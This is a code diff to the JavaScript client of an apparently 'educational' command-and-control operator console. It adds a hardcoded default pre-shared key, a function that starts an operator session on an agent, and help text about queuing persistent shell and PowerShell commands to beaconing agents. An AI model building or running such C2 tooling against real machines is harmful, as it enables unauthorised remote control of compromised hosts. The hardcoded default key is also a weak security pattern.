@@ -30,6 +30,8 @@ export function getDefaultServerUrl() {
   return typeof window !== 'undefined' ? window.location.origin : 'https://localhost:3443';
 }
 
+export const DEFAULT_PSK = 'educational-c2-psk-key';
+
 export function generatePsk() {
   const bytes = crypto.getRandomValues(new Uint8Array(16));
   return Array.from(bytes, (b) => b.toString(16).padStart(2, '0')).join('');
@@ -44,6 +46,18 @@ export async function queueAgentCommand(agentId, payload, commandType = 'shell')
   if (!res.ok) {
     const text = await res.text().catch(() => res.statusText);
     throw new Error(text || `Failed to queue command (${res.status})`);
+  }
+  return res.json();
+}
+
+export async function startOperatorSession(agentId) {
+  const res = await fetch(`${getApiBase()}/api/agents/${agentId}/session/start`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+  });
+  if (!res.ok) {
+    const text = await res.text().catch(() => res.statusText);
+    throw new Error(text || `Failed to start operator session (${res.status})`);
   }
   return res.json();
 }
@@ -244,7 +258,7 @@ export function getLocalHelpText(agent) {
 
   return [
     'C2 Session CLI — commands queued via POST /api/command/queue',
-    'Delivery happens on next HTTPS beacon. Shell is persistent — cd and sudo carry over.',
+    'Beacon pauses during operator session for fast delivery. cd/sudo persist in shell.',
     '',
     'Local commands:',
     '  help              — show this message',
@@ -257,6 +271,6 @@ export function getLocalHelpText(agent) {
     '  sleep 5           — agent sleeps 5 seconds',
     `  powershell ...    — Windows PowerShell (${shellHint})`,
     '',
-    'Click "Eliminate Session" to kill the persistent shell and reset cwd.',
+    'Click "Eliminate Session" to kill shell and resume normal beacon interval.',
   ].join('\n');
 }
